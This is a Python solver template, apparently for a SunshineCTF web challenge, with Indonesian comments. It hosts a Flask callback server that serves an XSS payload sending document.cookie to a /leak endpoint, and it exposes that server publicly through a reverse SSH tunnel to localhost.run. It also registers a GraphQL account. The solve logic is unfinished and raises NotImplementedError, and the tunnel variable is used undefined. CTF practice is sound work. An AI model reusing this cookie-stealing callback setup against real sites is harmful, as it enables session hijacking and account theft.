import re
import subprocess
import sys
import threading
import time
import json
import logging
import os

import requests
from flask import Flask, request

# ============================== CONFIG ====================================
WEB_URL = "https://usedgoods.web.2026.sunshinectf.games"  

LOCAL_PORT = 8000
TUNNEL_URL_RE = re.compile(r"https://[a-z0-9]+\.lhr\.life")

s = requests.Session()  

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logging.getLogger("solver")
logging.getLogger("werkzeug").setLevel(logging.CRITICAL)

# ============================== HOSTING ====================================
app = Flask(__name__)

@app.route("/leak", methods=["GET", "POST"])
def leak():
    data = request.values.to_dict()  # gabungan query string + form data
    print(f"[+] kena callback di /leak: {data}", file=sys.stderr)
    return "", 204


@app.route("/payload.html")
def payload_html():
    html = "<script>document.location='/leak?c='+document.cookie</script>"
    return html, 200, {"Content-Type": "text/html"}


def start_host() -> None:
    threading.Thread(
        target=lambda: app.run(host="127.0.0.1", port=LOCAL_PORT, use_reloader=False),
        daemon=True,
    ).start()
    time.sleep(1)  


def start_tunnel() -> tuple[str, subprocess.Popen]:
    proc = subprocess.Popen(
        [
            "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
            "-R", f"80:127.0.0.1:{LOCAL_PORT}", "nokey@localhost.run",
        ],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    deadline = time.time() + 20
    while time.time() < deadline:
        line = proc.stdout.readline()
        if not line and proc.poll() is not None:
            break
        match = TUNNEL_URL_RE.search(line)
        if match:
            return match.group(0), proc
    raise RuntimeError("tunnel gagal kebuka")


# ============================== SOLVE ======================================
def solve(public_url: str) -> str:
    r = s.post(f"{WEB_URL}/graphql", json={
        "query":"""mutation ($u: String!, $p: String!) {
                    register(username: $u, password: $p) { 
                        success 
                        message 
                        token 
                        account { 
                            handle 
                        } 
                    }
                }""",
        "variables":{
            "u":"apalah", #Ganti username
            "p":"apalah" #Ganti password
        }
    })
    print(r.text[:200])
    # print(r.status_code, r.text[:200])

    # r = s.post(f"{WEB_URL}/login", data={"user": "admin", "pass": "admin"})
    # r = s.post(f"{BOT_URL}/api/report", json={"url": f"{public_url}/payload.html"})
    # log.info(json.dumps(r.json(), indent=4))
    # time.sleep(10)

    log.info("[*] tunggu 30 detik untuk solver...")
    for _ in range(30):
        time.sleep(1)
        
    raise NotImplementedError("isi langkah solve() sesuai chall kamu")


if __name__ == "__main__":
    # start_host()
    # public_url, tunnel = start_tunnel()
    # os.system("stty sane")

    # log.info(f"[+] host lokal bisa diakses publik di: {public_url}", file=sys.stderr)

    try:
        flag = solve("")
        log.info(f"[+] flag: {flag}")
    except Exception as exc:
        log.error(f"[!] solve() error: {exc}")

    log.info("[*] host & tunnel masih jalan. Tekan Ctrl+C buat matiin.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        log.info("[*] matiin tunnel...")
        tunnel.terminate()
